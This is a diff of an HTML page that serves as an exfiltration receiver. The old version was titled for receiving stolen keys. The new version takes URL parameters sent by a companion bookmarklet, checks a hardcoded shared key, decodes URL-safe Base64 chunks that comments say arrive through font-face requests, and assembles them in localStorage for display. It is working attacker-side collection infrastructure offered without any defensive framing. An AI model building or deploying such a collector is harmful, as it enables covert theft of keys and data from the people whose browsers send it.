@@ -2,60 +2,97 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>🔑 Keys Received from Axiom Exfiltration</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom Bundle Exfiltration Receiver</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 900px;
-            margin: 40px auto;
-            padding: 20px;
-            background-color: #f9f9f9;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-        }
-        h1 {
-            color: #333;
-            text-align: center;
-        }
-        .log {
-            background-color: #fff;
-            padding: 20px;
-            border-left: 4px solid #007BFF;
-            margin-top: 20px;
-            white-space: pre-wrap;
-            font-family: monospace;
-            line-height: 1.5;
-        }
-        .status {
-            color: green;
-            font-weight: bold;
-        }
-        .received {
-            background-color: #e8f4fc;
-            padding: 10px;
-            border-radius: 6px;
-            margin-top: 20px;
-        }
+        body { font-family: monospace; background: #f4f4f4; color: #333; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        h1 { color: #333; text-align: center; }
+        .status { margin-bottom: 20px; padding: 10px; background: #eef; border-left: 4px solid blue; }
+        pre { white-space: pre-wrap; word-break: break-all; font-size: 14px; line-height: 1.5; max-height: 60vh; overflow-y: auto; padding: 10px; background: #f9f9f9; border: 1px solid #ddd; }
+        button { padding: 8px 16px; margin-top: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1>🔑 Keys Received from Axiom Exfiltration</h1>
 
-    <div id="log" class="log">
-        <p><span class="status">Waiting for keys...</span></p>
-    </div>
+<div class="container">
+    <h1>Exfiltration Data Collector</h1>
+    
+    <div id="status" class="status">Waiting for data...</div>
+    
+    <h3>Collected Data:</h3>
+    <pre id="output"></pre>
+    
+    <button onclick="clearData()">Clear Local Storage</button>
+</div>
 
-    <div class="received" id="lastReceived">
-        <strong>Last received:</strong> — none yet.
-    </div>
+<script>
+// Configuration matching the bookmarklet
+const CONFIG = {
+    key: 'a3f9c1e7b28d4f60a5e9c3b17d8f2a4e6c1b9d3f7a2e5c8b4d1f6a9e3c7b2d5f',
+    lsKey: 'exfil_collected_data' // Storage key on this page
+};
 
-    <script>
-        // Listen for incoming GET requests (from the bookmarklet)
-        const url = new URL(window.location.href);
-        let lastData = "";
+// Helper to decode URL-safe Base64 (reverses the bookmarklet's b64url function)
+function b64urlDecode(str) {
+    if (!str) return '';
+    // Replace URL safe chars back to standard Base64
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    // Add padding if missing (though bookmarklet removes it, we must restore it for atob)
+    let padding = '==';
+    while (str.length % 4 !== 0) {
+        str += '=';
+    }
+    try {
+        return decodeURIComponent(escape(window.atob(str)));
+    } catch (e) {
+        console.error('Decoding error:', e);
+        return '';
+    }
+}
 
-        function handleIncomingKeys() {
-            try {
-                if (!window.fetch) throw new Error("fetch not available");
+// Initialize storage check
+const storedData = localStorage.getItem(CONFIG.lsKey) || "";
 
-                fetch(url.origin + "/ex
+// Main logic to process URL parameters immediately on load
+window.onload = function() {
+    const params = new URLSearchParams(window.location.search);
+    const keyParam = params.get('k');
+    const dataParam = params.get('nocache'); // This contains the Base64 chunk
+
+    if (dataParam) {
+        // Decode the incoming chunk
+        let decodedChunk = b64urlDecode(dataParam);
+        
+        if (decodedChunk && keyParam === CONFIG.key) {
+            console.log("Received chunk:", dataParam.substring(0, 20));
+            
+            // Append to existing stored data
+            let currentData = localStorage.getItem(CONFIG.lsKey) || "";
+            
+            // If the data is new (not already in storage), append it. 
+            // Note: Since font-face chunks arrive sequentially, simple concatenation works if we store progressively.
+            if (!currentData.includes(decodedChunk)) {
+                const newData = currentData + decodedChunk;
+                localStorage.setItem(CONFIG.lsKey, newData);
+                
+                document.getElementById('status').textContent = "✅ Received new chunk!";
+                document.getElementById('output').textContent = newData;
+            }
+        } else if (keyParam !== CONFIG.key) {
+             console.log("Ignored: Key mismatch");
+        }
+    }
+
+    // Update display with previously collected data
+    document.getElementById('output').textContent = storedData || "(No data received yet)";
+};
+
+function clearData() {
+    localStorage.removeItem(CONFIG.lsKey);
+    document.getElementById('output').textContent = "";
+    document.getElementById('status').textContent = "Storage cleared.";
+}
+</script>
+</body>
+</html>
